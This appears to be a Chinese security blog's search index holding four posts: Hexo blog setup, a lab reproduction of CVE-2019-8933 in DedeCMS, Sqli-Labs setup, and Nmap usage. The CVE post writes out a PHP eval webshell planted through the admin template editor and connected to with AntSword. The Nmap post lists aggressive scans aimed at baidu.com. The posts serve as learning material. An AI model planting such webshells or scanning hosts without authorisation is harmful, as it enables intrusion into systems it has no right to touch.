<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HEXO博客搭建</title>
    <url>/2023/07/26/HEXO%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="搭建HEXO博客"><a href="#搭建HEXO博客" class="headerlink" title="搭建HEXO博客"></a>搭建HEXO博客</h1><p>​                                                   </p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a><strong>下载</strong></h2><h4 id="1-提前安装好-node-js-https-nodejs-org-en-左边的那个"><a href="#1-提前安装好-node-js-https-nodejs-org-en-左边的那个" class="headerlink" title="1.提前安装好(node.js)[https://nodejs.org/en] 左边的那个"></a><strong>1.提前安装好(node.js)[<a class="link"   href="https://nodejs.org/en]" >https://nodejs.org/en]<i class="fas fa-external-link-alt"></i></a> 左边的那个</strong></h4><h4 id="2-提前安装好-GIt-https-git-scm-com-downloads"><a href="#2-提前安装好-GIt-https-git-scm-com-downloads" class="headerlink" title="2.提前安装好(GIt)[https://git-scm.com/downloads]"></a><strong>2.提前安装好(GIt)[<a class="link"   href="https://git-scm.com/downloads]" >https://git-scm.com/downloads]<i class="fas fa-external-link-alt"></i></a></strong></h4><h4 id="3-提前注册好一个github账号"><a href="#3-提前注册好一个github账号" class="headerlink" title="3.提前注册好一个github账号"></a><strong>3.提前注册好一个github账号</strong></h4><h4 id="4-如果文章图片没有显示，请自行挂代理"><a href="#4-如果文章图片没有显示，请自行挂代理" class="headerlink" title="4.如果文章图片没有显示，请自行挂代理"></a><strong>4.如果文章图片没有显示，请自行挂代理</strong></h4><p>​                                   </p>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a><strong>基本命令</strong></h2><h4 id="进入cmd-win-R-命令"><a href="#进入cmd-win-R-命令" class="headerlink" title="进入cmd (win+R)命令"></a>进入<code>cmd (win+R)</code>命令</h4><h4 id="hexo-g-生成编译好的博客文件"><a href="#hexo-g-生成编译好的博客文件" class="headerlink" title="hexo g 生成编译好的博客文件"></a><code>hexo g</code> 生成编译好的博客文件</h4><h4 id="hexo-clean-清理编译好的博客文件"><a href="#hexo-clean-清理编译好的博客文件" class="headerlink" title="hexo clean 清理编译好的博客文件"></a><code>hexo clean</code> 清理编译好的博客文件</h4><h4 id="hexo-s-启动博客服务"><a href="#hexo-s-启动博客服务" class="headerlink" title="hexo s 启动博客服务"></a><code>hexo s</code> 启动博客服务</h4><h4 id="hexo-deploy-发布博客"><a href="#hexo-deploy-发布博客" class="headerlink" title="hexo deploy 发布博客"></a><strong><code>hexo deploy</code> 发布博客</strong></h4><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>​                                                                                                                                                                                                 </p>
<h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a><strong>安装HEXO</strong></h2><h4 id="打开cmd-执行-npm-intall-hexo-g"><a href="#打开cmd-执行-npm-intall-hexo-g" class="headerlink" title="打开cmd,执行 npm intall hexo -g"></a><code>打开cmd,执行 npm intall hexo -g</code></h4><p>​                                             </p>
<h3 id="使用Git克隆"><a href="#使用Git克隆" class="headerlink" title="使用Git克隆"></a><strong>使用Git克隆</strong></h3><h4 id="git-clone-https-github-com-theme-keep-hexo-theme-keep-starter"><a href="#git-clone-https-github-com-theme-keep-hexo-theme-keep-starter" class="headerlink" title="git clone https://github.com/theme-keep/hexo-theme-keep-starter&lt;博客名&gt;"></a><code>git clone https://github.com/theme-keep/hexo-theme-keep-starter&lt;博客名&gt;</code></h4><p>​                                     </p>
<h2 id="进入文件夹"><a href="#进入文件夹" class="headerlink" title="进入文件夹"></a><strong>进入文件夹</strong></h2><h4 id="cd"><a href="#cd" class="headerlink" title="cd&lt;文件夹&gt;"></a><code>cd&lt;文件夹&gt;</code></h4><p>​                           </p>
<h2 id="如果下载速度太慢，可以使用淘宝源下载"><a href="#如果下载速度太慢，可以使用淘宝源下载" class="headerlink" title="如果下载速度太慢，可以使用淘宝源下载"></a><strong>如果下载速度太慢，可以使用淘宝源下载</strong></h2><h4 id="npm-config-set-registry-https-registry-npm-taobao-org"><a href="#npm-config-set-registry-https-registry-npm-taobao-org" class="headerlink" title="npm config set registry https://registry.npm.taobao.org/"></a><code>npm config set registry https://registry.npm.taobao.org/</code></h4><p>​                                               </p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h2><h4 id="cd-hexo-theme-keep-starter"><a href="#cd-hexo-theme-keep-starter" class="headerlink" title="cd hexo-theme-keep-starter"></a><strong><code>cd hexo-theme-keep-starter</code></strong></h4><h4 id="npm-install-安装"><a href="#npm-install-安装" class="headerlink" title="npm install  (安装)"></a><strong><code>npm install</code>  (安装)</strong></h4><p>​                      </p>
<h2 id="启动Keep模板"><a href="#启动Keep模板" class="headerlink" title="启动Keep模板"></a><strong>启动Keep模板</strong></h2><h4 id="cd-hexo-theme-keep-starter-1"><a href="#cd-hexo-theme-keep-starter-1" class="headerlink" title="cd hexo-theme-keep-starter"></a><strong><code>cd hexo-theme-keep-starter</code></strong></h4><h4 id="npm-install-安装-1"><a href="#npm-install-安装-1" class="headerlink" title="npm install  (安装)"></a><strong><code>npm install</code>  (安装)</strong></h4><p>​                                                   </p>
<h2 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a><strong>运行项目</strong></h2><h4 id="npm-run-server（启动服务）"><a href="#npm-run-server（启动服务）" class="headerlink" title="npm run server（启动服务）"></a><strong><code>npm run server</code>（启动服务）</strong></h4><p>​                                                </p>
<h2 id="编译生成静态文件"><a href="#编译生成静态文件" class="headerlink" title="编译生成静态文件"></a><strong>编译生成静态文件</strong></h2><h4 id="npm-run-build"><a href="#npm-run-build" class="headerlink" title="npm run build"></a><strong><code>npm run build</code></strong></h4><p>​                                                            </p>
<h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a><strong>配置主题</strong></h2><h4 id="npm-run-deploy"><a href="#npm-run-deploy" class="headerlink" title="npm run deploy"></a><strong><code>npm run deploy</code></strong></h4><p>​                                                                        </p>
<h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a><strong>安装工具</strong></h2><h4 id="安装Typora或者VScode，建议使用Typora，插入图片更加方便。"><a href="#安装Typora或者VScode，建议使用Typora，插入图片更加方便。" class="headerlink" title="安装Typora或者VScode，建议使用Typora，插入图片更加方便。"></a><strong>安装Typora或者VScode，建议使用Typora，插入图片更加方便。</strong></h4><p>​                                                                                    </p>
<h2 id="配置图片"><a href="#配置图片" class="headerlink" title="配置图片"></a><strong>配置图片</strong></h2><h4 id="打开Typora，点击文件，进入偏好设置，点击图像-如下图所示"><a href="#打开Typora，点击文件，进入偏好设置，点击图像-如下图所示" class="headerlink" title="打开Typora，点击文件，进入偏好设置，点击图像 如下图所示"></a><strong>打开Typora，点击文件，进入偏好设置，点击图像 如下图所示</strong></h4><h4 id="设置路径为下"><a href="#设置路径为下" class="headerlink" title="设置路径为下"></a><strong>设置路径为下</strong></h4><h4 id="source-images-filename"><a href="#source-images-filename" class="headerlink" title="../../source/images/${filename}"></a><strong><code>../../source/images/$&#123;filename&#125;</code></strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/1.png"
                     
                ></p>
<p>​                                          </p>
<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a><strong>新建文章</strong></h2><h4 id="进入Source文件夹下，打开POST文件，找到-在文件上方开启cmd，执行hexo-new-post"><a href="#进入Source文件夹下，打开POST文件，找到-在文件上方开启cmd，执行hexo-new-post" class="headerlink" title="进入Source文件夹下，打开POST文件，找到&lt;博客名&gt;,在文件上方开启cmd，执行hexo new post&lt;文章标题&gt;"></a><strong>进入Source文件夹下，打开POST文件，找到&lt;博客名&gt;,在文件上方开启cmd，执行hexo new post&lt;文章标题&gt;</strong></h4><h4 id="即可开启文章"><a href="#即可开启文章" class="headerlink" title="即可开启文章"></a><strong>即可开启文章</strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/2.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/3.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/4.png"
                     
                ></p>
<h2 id="配置部署信息"><a href="#配置部署信息" class="headerlink" title="配置部署信息"></a><strong>配置部署信息</strong></h2><h5 id="进入博客文件夹，打开-config-yml-在最后一行输入："><a href="#进入博客文件夹，打开-config-yml-在最后一行输入：" class="headerlink" title="进入博客文件夹，打开 _config.yml , 在最后一行输入："></a><strong>进入博客文件夹，打开 _config.yml , 在最后一行输入：</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type:git</span><br><span class="line">repo: https://github.com/PumpkinBridge/PumpkinBridge.gihub.io</span><br><span class="line">#https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io                            </span><br><span class="line">branch:main</span><br></pre></td></tr></table></figure>



<hr>
<p><code>其中repo的内容上方提到过:git@github.com:&lt;GitHub用户名&gt;/&lt;个性名&gt;.github.io.git</code></p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a><strong>部署</strong></h2><h5 id="进入博客文件夹，打开-cmd-，依次执行："><a href="#进入博客文件夹，打开-cmd-，依次执行：" class="headerlink" title="进入博客文件夹，打开 cmd ，依次执行："></a><strong>进入博客文件夹，打开 <code>cmd</code> ，依次执行：</strong></h5><h5 id="生成编译文件：hexo-g"><a href="#生成编译文件：hexo-g" class="headerlink" title="生成编译文件：hexo g"></a><strong>生成编译文件：<code>hexo g</code></strong></h5><h5 id="发布博客：hexo-deploy"><a href="#发布博客：hexo-deploy" class="headerlink" title="发布博客：hexo deploy"></a><strong>发布博客：<code>hexo deploy</code></strong></h5><h5 id="执行完后等待1-2分钟，即可访问-https-github-io"><a href="#执行完后等待1-2分钟，即可访问-https-github-io" class="headerlink" title="执行完后等待1-2分钟，即可访问 https:&#x2F;&#x2F;&lt;个性名&gt;.github.io"></a><strong>执行完后等待1-2分钟，即可访问 https:&#x2F;&#x2F;&lt;个性名&gt;.github.io</strong></h5><h5 id="就可以进入到你的博客啦"><a href="#就可以进入到你的博客啦" class="headerlink" title="就可以进入到你的博客啦"></a><strong>就可以进入到你的博客啦</strong></h5>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2019-8933)漏洞复现</title>
    <url>/2023/08/24/(CVE-2019-8933)-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1>（CVE-2019-8933)漏洞复现

<p><em><strong>1.第一步，打开环境，这里我用的是80：14882端口</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps1.jpg"
                      alt="img"
                > </p>
<p><em><strong>2.点击上传跳转页面</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps2.jpg"
                      alt="img"
                > </p>
<p><em><strong>3.在upload&#x2F;后写dede进入到该管理后台</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps3.jpg"
                      alt="img"
                > </p>
<p><em><strong>4.点击模板，进入到默认模板管理</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps4.jpg"
                      alt="img"
                > </p>
<p><em><strong>5.新建模板</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps5.jpg"
                      alt="img"
                > </p>
<p><em><strong>6.在后台输入一句话木马<?php eval($_POST[123]);?>点击保存</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps6.jpg"
                      alt="img"
                > </p>
<p><em><strong>7.生成-更新主页HTML-浏览选择新建的模板-更改后缀为php</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps7.jpg"
                      alt="img"
                > </p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps8.jpg"
                      alt="img"
                > </p>
<p><em><strong>8.使用蚁剑连接(<a class="link"   href="http://202.194.97.206:35497/uploads/index.php" >http://202.194.97.206:35497/uploads/index.php<i class="fas fa-external-link-alt"></i></a>)</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps9.jpg"
                      alt="img"
                > </p>
<p><em><strong>9.连接成功！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps10.jpg"
                      alt="img"
                > </p>
<p><em><strong>10.成功在主目录下tmp文件夹中找到flag！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps11.jpg"
                      alt="img"
                > </p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-Labs环境搭建</title>
    <url>/2023/07/26/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Sqli-Labs环境搭建"><a href="#Sqli-Labs环境搭建" class="headerlink" title="Sqli-Labs环境搭建"></a>Sqli-Labs环境搭建</h1><h4 id="SQLI，sql-injection，我们称之为sql注入。何为sql，英文：Structured-Query-Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS-SQL-Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。"><a href="#SQLI，sql-injection，我们称之为sql注入。何为sql，英文：Structured-Query-Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS-SQL-Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。" class="headerlink" title="SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。"></a><strong>SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。</strong></h4><p>​       </p>
<h2 id="SQLI-LAB下载地址："><a href="#SQLI-LAB下载地址：" class="headerlink" title="SQLI-LAB下载地址："></a>SQLI-LAB下载地址：</h2><p><a class="link"   href="https://github.com/Audi-1/sqli-labs" >https://github.com/Audi-1/sqli-labs<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="点击下载Download-ZIP"><a href="#点击下载Download-ZIP" class="headerlink" title="点击下载Download ZIP"></a><strong>点击下载Download ZIP</strong></h4><p> <img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.png"
                     
                >   </p>
<p>​               </p>
<h2 id="WEB环境搭建"><a href="#WEB环境搭建" class="headerlink" title="WEB环境搭建"></a><strong>WEB环境搭建</strong></h2><h4 id="在安装靶场之前，我们还需要搭建web运行环境："><a href="#在安装靶场之前，我们还需要搭建web运行环境：" class="headerlink" title="在安装靶场之前，我们还需要搭建web运行环境："></a>在安装靶场之前，我们还需要搭建web运行环境：</h4><h4 id="这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载"><a href="#这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载" class="headerlink" title="这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载"></a>这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载</h4><h4 id="下载后安装即可。"><a href="#下载后安装即可。" class="headerlink" title="下载后安装即可。"></a>下载后安装即可。</h4><p>​                      </p>
<h2 id="Sql-labs靶场环境搭建"><a href="#Sql-labs靶场环境搭建" class="headerlink" title="Sql-labs靶场环境搭建"></a><strong>Sql-labs靶场环境搭建</strong></h2><h4 id="安装好phpstudy后打开根目录"><a href="#安装好phpstudy后打开根目录" class="headerlink" title="安装好phpstudy后打开根目录"></a>安装好phpstudy后打开根目录</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png"
                     
                ></p>
<p>​                    </p>
<h4 id="把刚才下载的压缩包放到根目录下"><a href="#把刚才下载的压缩包放到根目录下" class="headerlink" title="把刚才下载的压缩包放到根目录下"></a>把刚才下载的压缩包放到根目录下</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"
                     
                ></p>
<p>​                         </p>
<h4 id="打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds-inc"><a href="#打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds-inc" class="headerlink" title="打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds.inc"></a>打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds.inc</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.png"
                     
                ></p>
<p>​              </p>
<h4 id="打开后将-dbpass-‘’改为-dbpass-‘root’并保存"><a href="#打开后将-dbpass-‘’改为-dbpass-‘root’并保存" class="headerlink" title="打开后将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’并保存"></a>打开后将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’并保存</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.png"
                     
                ></p>
<p>​                     </p>
<h4 id="完成后打开phpstudy，启动Apache和Mysql"><a href="#完成后打开phpstudy，启动Apache和Mysql" class="headerlink" title="完成后打开phpstudy，启动Apache和Mysql"></a>完成后打开phpstudy，启动Apache和Mysql</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.png"
                     
                ></p>
<p>​               </p>
<h4 id="接着浏览器打开“http-127-0-0-1-sqli-labs-master-”访问首页"><a href="#接着浏览器打开“http-127-0-0-1-sqli-labs-master-”访问首页" class="headerlink" title="接着浏览器打开“http://127.0.0.1/sqli-labs-master/”访问首页"></a>接着浏览器打开“<a class="link"   href="http://127.0.0.1/sqli-labs-master/%E2%80%9D%E8%AE%BF%E9%97%AE%E9%A6%96%E9%A1%B5" >http://127.0.0.1/sqli-labs-master/”访问首页<i class="fas fa-external-link-alt"></i></a></h4><h4 id="打开以后图示如下"><a href="#打开以后图示如下" class="headerlink" title="打开以后图示如下"></a>打开以后图示如下</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/5.png"
                     
                ></p>
<p>​           </p>
<h4 id="先点击Setup-reset-Database-for-labs使其自动创建数据库，创建表并填充数据后是这样的页面"><a href="#先点击Setup-reset-Database-for-labs使其自动创建数据库，创建表并填充数据后是这样的页面" class="headerlink" title="先点击Setup&#x2F;reset Database for labs使其自动创建数据库，创建表并填充数据后是这样的页面"></a>先点击Setup&#x2F;reset Database for labs使其自动创建数据库，创建表并填充数据后是这样的页面</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/6.png"
                     
                ></p>
<h4 id="到这里基本上就完成Sqli-Labs的搭建啦"><a href="#到这里基本上就完成Sqli-Labs的搭建啦" class="headerlink" title="到这里基本上就完成Sqli-Labs的搭建啦~"></a>到这里基本上就完成Sqli-Labs的搭建啦~</h4><h4 id="这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！"><a href="#这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！" class="headerlink" title="这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！"></a>这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！</h4><h4 id="谢谢观看"><a href="#谢谢观看" class="headerlink" title="谢谢观看~"></a>谢谢观看~</h4>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap搭建及使用</title>
    <url>/2023/07/28/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Nmap搭建及使用"><a href="#Nmap搭建及使用" class="headerlink" title="Nmap搭建及使用"></a>Nmap搭建及使用</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h3><h5 id="从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避-欺骗，Nmap是大大小小黑客行动的基本工具。"><a href="#从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避-欺骗，Nmap是大大小小黑客行动的基本工具。" class="headerlink" title="从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避&#x2F;欺骗，Nmap是大大小小黑客行动的基本工具。"></a><strong>从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避&#x2F;欺骗，Nmap是大大小小黑客行动的基本工具。</strong></h5><h5 id="为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。"><a href="#为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。" class="headerlink" title="为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。"></a><strong>为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。</strong></h5><p>​                </p>
<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a><strong>功能</strong></h3><h4 id="1-主机探测"><a href="#1-主机探测" class="headerlink" title="1.主机探测"></a><strong>1.主机探测</strong></h4><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a><strong>2.<a class="link"   href="https://so.csdn.net/so/search?q=%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&spm=1001.2101.3001.7020" >端口扫描<i class="fas fa-external-link-alt"></i></a></strong></h4><h4 id="3-版本检测"><a href="#3-版本检测" class="headerlink" title="3.版本检测"></a><strong>3.版本检测</strong></h4><h4 id="4-支持探测脚本的编写"><a href="#4-支持探测脚本的编写" class="headerlink" title="4.支持探测脚本的编写"></a><strong>4.支持探测脚本的编写</strong></h4><p>​     </p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h3><h4 id="首先访问Nmap官网-http-nmap-org，获得windows对应版本的安装包。"><a href="#首先访问Nmap官网-http-nmap-org，获得windows对应版本的安装包。" class="headerlink" title="首先访问Nmap官网:http://nmap.org，获得windows对应版本的安装包。"></a><strong>首先访问Nmap官网:<a class="link"   href="http://nmap.org,获得windows对应版本的安装包./" >http://nmap.org，获得windows对应版本的安装包。<i class="fas fa-external-link-alt"></i></a></strong></h4><h4 id="因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法"><a href="#因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法" class="headerlink" title="因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法~"></a><strong>因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法~</strong></h4><h4 id="下载对应安装包后，点击安装，根据提示-一直安装即可。"><a href="#下载对应安装包后，点击安装，根据提示-一直安装即可。" class="headerlink" title="下载对应安装包后，点击安装，根据提示,一直安装即可。"></a><strong>下载对应安装包后，点击安装，根据提示,一直安装即可。</strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/1.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/2.png"
                     
                ></p>
<h4 id="选择并更改安装路径，点击安装"><a href="#选择并更改安装路径，点击安装" class="headerlink" title="选择并更改安装路径，点击安装"></a><strong>选择并更改安装路径，点击安装</strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/3.png"
                     
                ></p>
<h4 id="安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件"><a href="#安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件" class="headerlink" title="安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件"></a><strong>安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件</strong></h4><p>​            </p>
<h3 id="Nmap的基本命令以及扫描类型"><a href="#Nmap的基本命令以及扫描类型" class="headerlink" title="Nmap的基本命令以及扫描类型"></a><strong>Nmap的基本命令</strong>以及扫描类型</h3><p>  <strong>Intense scan                  nmap -T4 -A -v <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Intense scan plus UDP         nmap -sS -sU -T4 -A -v <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Intense scan, all TCP ports   nmap -p 1-65535 -T4 -A -v <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Intense scan, no ping         nmap -T4 -A -v -Pn <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Ping scan                     nmap -sn <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Quick scan                    nmap -T4 -F <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Quick scan plus               nmap -sV -T4 -O -F --version-light <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Quick traceroute              nmap -sn --traceroute <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
